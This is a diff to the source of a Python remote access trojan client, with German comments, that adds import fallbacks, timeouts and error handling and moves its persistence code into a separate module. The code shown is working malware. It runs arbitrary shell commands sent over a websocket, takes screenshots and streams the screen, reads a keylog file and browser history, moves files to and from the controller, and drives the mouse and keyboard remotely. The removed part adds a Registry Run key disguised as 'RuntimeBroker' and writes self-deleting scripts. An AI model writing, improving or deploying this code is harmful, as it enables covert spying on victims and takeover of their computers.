@@ -13,12 +13,31 @@ import sys
 import urllib.request
 from datetime import datetime
 
-import browserhistory as bh
-import mss
-import mss.tools
+from modules.persistence import manage_persistence, uninstall_client
+
+try:
+    import browserhistory as bh
+except ImportError:
+    bh = None
+
+try:
+    import mss
+    import mss.tools
+except ImportError:
+    mss = None
+
 import psutil
-import pyautogui
-import pymsgbox  # For message box alerts
+
+try:
+    import pyautogui
+except ImportError:
+    pyautogui = None
+
+try:
+    import pymsgbox  # For message box alerts
+except ImportError:
+    pymsgbox = None
+
 import websockets
 from PIL import Image
 
@@ -26,8 +45,6 @@ from PIL import Image
 KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
 CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")
 HEARTBEAT_INTERVAL = 45  # Sekunden
-PERSISTENCE_NAME = "RuntimeBroker"  # Name für den Registry-Eintrag/Task
-
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 
 # --- Optionales Modul: Keylogger ---
@@ -53,10 +70,12 @@ def get_initial_info() -> dict:
     except Exception:
         user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unbekannt"
     
-    try:
-        screen_width, screen_height = pyautogui.size()
-    except Exception:
-        screen_width, screen_height = 0, 0
+    screen_width, screen_height = 0, 0
+    if pyautogui:
+        try:
+            screen_width, screen_height = pyautogui.size()
+        except Exception:
+            pass
         
     return {
         "type": "info",
@@ -129,6 +148,8 @@ def get_network_info() -> str:
 
 def get_history() -> str:
     """Ruft den Browserverlauf ab."""
+    if not bh:
+        return "Fehler: 'browserhistory' Modul nicht installiert."
     try:
         history = bh.get_browserhistory()
         output = ["Browserverlauf:"]
@@ -222,105 +243,14 @@ def kill_process(pid: str) -> str:
 
 def show_message_box(text: str) -> str:
     """Zeigt eine Nachrichtenbox an."""
+    if not pymsgbox:
+        return "Fehler: 'pymsgbox' Modul nicht installiert."
     try:
         pymsgbox.alert(text=text, title="Nachricht vom Server")
         return "Nachrichtenbox angezeigt."
     except Exception as e:
         return f"Fehler beim Anzeigen der Nachrichtenbox: {e}"
 
-def _get_script_path() -> str:
-    """Gibt den Pfad des aktuellen Skripts zurück."""
-    if getattr(sys, 'frozen', False):
-        return sys.executable
-    else:
-        return os.path.realpath(__file__)
-
-def _manage_persistence_windows(enable=True) -> str:
-    """Manages persistence on Windows using the Registry."""
-    try:
-        exe_path = sys.executable
-        dest_folder = os.path.join(os.environ["APPDATA"], PERSISTENCE_NAME)
-        dest_path = os.path.join(dest_folder, f"{PERSISTENCE_NAME}.exe")
-        reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-
-        if enable:
-            os.makedirs(dest_folder, exist_ok=True)
-            if os.path.realpath(exe_path).lower() != os.path.realpath(dest_path).lower():
-                shutil.copyfile(exe_path, dest_path)
-            cmd = f'reg add HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /t REG_SZ /d "{dest_path}" /f'
-            subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
-            return f"Persistence enabled. Client will start on next login from '{dest_path}'."
-        else:
-            cmd = f'reg delete HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /f'
-            subprocess.run(cmd, shell=True, check=False, capture_output=True, text=True)
-            if os.path.exists(dest_path):
-                subprocess.run(f"taskkill /f /im {os.path.basename(dest_path)}", shell=True, check=False, capture_output=True)
-                os.remove(dest_path)
-                os.rmdir(dest_folder)
-            return "Persistence successfully removed."
-    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
-        return f"Error managing Windows persistence: {e}"
-    except Exception as e:
-        return f"An unexpected error occurred during Windows persistence: {e}"
-
-def manage_persistence(enable=True) -> str:
-    """Manages client persistence across Windows, macOS, and Linux."""
-    system = platform.system()
-    if system == "Windows":
-        return _manage_persistence_windows(enable)
-    elif system == "Darwin":
-        return "macOS persistence management not implemented."
-    elif system == "Linux":
-        return "Linux persistence management not implemented."
-    else:
-        return f"Persistence is not supported on this OS: {system}."
-
-def uninstall_client() -> str:
-    """Removes persistence and schedules the client for self-deletion."""
-    try:
-        # 1. Remove persistence across all platforms
-        persistence_msg = manage_persistence(enable=False)
-        
-        # 2. Self-deletion logic
-        client_path = _get_script_path()
-        
-        if platform.system() == "Windows":
-            # Use a batch script for deletion
-            batch_content = f"""
-@echo off
-echo "Uninstalling RAT client..."
-timeout /t 3 /nobreak > NUL
-taskkill /f /im "{os.path.basename(client_path)}" > NUL
-del "{client_path}"
-del "%~f0"
-"""
-            batch_path = os.path.join(os.environ["TEMP"], "uninstall.bat")
-            with open(batch_path, "w") as f:
-                f.write(batch_content)
-            
-            subprocess.Popen('"' + batch_path + '"', shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
-            
-        else:  # Linux and macOS
-            # Use a shell script for deletion
-            script_content = f"""
-#!/bin/sh
-echo "Uninstalling RAT client..."
-sleep 3
-kill -9 {os.getpid()}
-rm -f "{client_path}"
-rm -- "$0"
-"""
-            script_path = os.path.join(os.path.expanduser("~"), ".uninstall.sh")
-            with open(script_path, "w") as f:
-                f.write(script_content)
-            
-            os.chmod(script_path, 0o755)
-            subprocess.Popen([script_path], shell=True)
-
-        return f"{persistence_msg}\nUninstallation process started. The client will be terminated and deleted shortly."
-
-    except Exception as e:
-        return f"Error during uninstallation: {e}"
 
 # === Datei- und Verzeichnisfunktionen ===
 def list_directory(path=".") -> str:
@@ -566,20 +496,28 @@ def list_webcams() -> str:
 async def run_shell_command(command: str) -> str:
     """Führt einen Shell-Befehl aus und gibt die Ausgabe zurück."""
     try:
+        # Use shell based on OS
+        shell = os.environ.get("SHELL", "/bin/sh") if platform.system() != "Windows" else None
+
         proc = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
-            cwd=os.getcwd()
+            cwd=os.getcwd(),
+            executable=shell
         )
         
-        stdout, stderr = await proc.communicate()
-        
+        try:
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
+        except asyncio.TimeoutError:
+            proc.kill()
+            return "Fehler: Befehl hat das Zeitlimit von 60 Sekunden überschritten."
+
         output = ""
         if stdout:
-            output += stdout.decode(errors='ignore')
+            output += stdout.decode(errors='replace')
         if stderr:
-            output += stderr.decode(errors='ignore')
+            output += stderr.decode(errors='replace')
             
         return output if output else f"Befehl '{command}' ausgeführt (keine Ausgabe)."
         
@@ -602,24 +540,34 @@ async def process_commands(websocket: websockets.ClientConnection):
             if action == "exec":
                 output = await run_shell_command(command.get("command"))
             elif action == "screenshot":
-                with mss.mss() as sct:
-                    sct_img = sct.grab(sct.monitors[1])
-                    img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size) if sct_img else b""
-                    if not img_bytes:
-                        img_bytes = b""
-                response = {"type": "screenshot", "data": base64.b64encode(img_bytes).decode("utf-8")}
-            elif action == "download":
-                path = command.get("path")
-                if os.path.isfile(path):
-                    with open(path, "rb") as f:
-                        file_data = base64.b64encode(f.read()).decode("utf-8")
-                    response = {"type": "file_download", "filename": os.path.basename(path), "data": file_data}
+                if mss:
+                    try:
+                        with mss.mss() as sct:
+                            sct_img = sct.grab(sct.monitors[1])
+                            img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size) if sct_img else b""
+                            response = {"type": "screenshot", "data": base64.b64encode(img_bytes).decode("utf-8")}
+                    except Exception as e:
+                        output = f"Screenshot Fehler: {e}"
                 else:
-                    output = "Fehler: Datei nicht gefunden."
+                    output = "Fehler: 'mss' Modul nicht installiert."
+            elif action == "download":
+                try:
+                    path = command.get("path")
+                    if os.path.isfile(path):
+                        with open(path, "rb") as f:
+                            file_data = base64.b64encode(f.read()).decode("utf-8")
+                        response = {"type": "file_download", "filename": os.path.basename(path), "data": file_data}
+                    else:
+                        output = "Fehler: Datei nicht gefunden."
+                except Exception as e:
+                    output = f"Download Fehler: {e}"
             elif action == "upload":
-                with open(command.get("filename"), "wb") as f:
-                    f.write(base64.b64decode(command.get("data")))
-                output = f"Datei gespeichert: {command.get('filename')}"
+                try:
+                    with open(command.get("filename"), "wb") as f:
+                        f.write(base64.b64decode(command.get("data")))
+                    output = f"Datei gespeichert: {command.get('filename')}"
+                except Exception as e:
+                    output = f"Upload Fehler: {e}"
             elif action == "ls":
                 output = list_directory(command.get("path", "."))
             elif action == "cd":
@@ -657,15 +605,21 @@ async def process_commands(websocket: websockets.ClientConnection):
                 if not keyboard or not os.path.exists(KEYLOG_FILE_PATH):
                     output = "Keylogger nicht verfügbar oder keine Daten."
                 else:
-                    with open(KEYLOG_FILE_PATH, "rb") as f:
-                        f.seek(0, os.SEEK_END)
-                        filesize = f.tell()
-                        count = command.get("count", 1000)
-                        f.seek(max(0, filesize - count))
-                        output = f.read().decode("utf-8", errors="ignore")
+                    try:
+                        with open(KEYLOG_FILE_PATH, "rb") as f:
+                            f.seek(0, os.SEEK_END)
+                            filesize = f.tell()
+                            count = command.get("count", 1000)
+                            f.seek(max(0, filesize - count))
+                            output = f.read().decode("utf-8", errors="replace")
+                    except Exception as e:
+                        output = f"Keylogger Fehler: {e}"
             elif action == "screenstream_start":
-                await screen_streamer.start(websocket)
-                output = "Screen-Streaming gestartet."
+                if mss:
+                    await screen_streamer.start(websocket)
+                    output = "Screen-Streaming gestartet."
+                else:
+                    output = "Fehler: 'mss' Modul nicht installiert."
             elif action == "screenstream_stop":
                 await screen_streamer.stop()
                 output = "Screen-Streaming gestoppt."
@@ -686,29 +640,41 @@ async def process_commands(websocket: websockets.ClientConnection):
                 await webcam_streamer.stop()
                 output = "Webcam-Streaming gestoppt."
             elif action == "mouse":
-                event_data = command.get("data", {})
-                event_type = event_data.get("type")
-                if event_type == "move":
-                    pyautogui.moveTo(event_data.get("x"), event_data.get("y"))
-                elif event_type == "click":
-                    x = event_data.get("x")
-                    y = event_data.get("y")
-                    if x is not None and y is not None:
-                        pyautogui.moveTo(x, y)
-                    pyautogui.click(
-                        button=event_data.get("button", "left"),
-                        clicks=event_data.get("clicks", 1)
-                    )
-                elif event_type == "scroll":
-                    pyautogui.scroll(event_data.get("delta_y", 0))
+                if pyautogui:
+                    try:
+                        event_data = command.get("data", {})
+                        event_type = event_data.get("type")
+                        if event_type == "move":
+                            pyautogui.moveTo(event_data.get("x"), event_data.get("y"))
+                        elif event_type == "click":
+                            x = event_data.get("x")
+                            y = event_data.get("y")
+                            if x is not None and y is not None:
+                                pyautogui.moveTo(x, y)
+                            pyautogui.click(
+                                button=event_data.get("button", "left"),
+                                clicks=event_data.get("clicks", 1)
+                            )
+                        elif event_type == "scroll":
+                            pyautogui.scroll(event_data.get("delta_y", 0))
+                    except Exception as e:
+                        output = f"Maus-Event Fehler: {e}"
+                else:
+                    output = "Fehler: 'pyautogui' Modul nicht installiert."
             elif action == "keyboard":
-                event_data = command.get("data", {})
-                key = event_data.get("key")
-                if key:
-                    if event_data.get("down", True):
-                        pyautogui.keyDown(key)
-                    else:
-                        pyautogui.keyUp(key)
+                if pyautogui:
+                    try:
+                        event_data = command.get("data", {})
+                        key = event_data.get("key")
+                        if key:
+                            if event_data.get("down", True):
+                                pyautogui.keyDown(key)
+                            else:
+                                pyautogui.keyUp(key)
+                    except Exception as e:
+                        output = f"Keyboard-Event Fehler: {e}"
+                else:
+                    output = "Fehler: 'pyautogui' Modul nicht installiert."
             else:
                 output = f"Unbekannte Aktion: {action}"
 
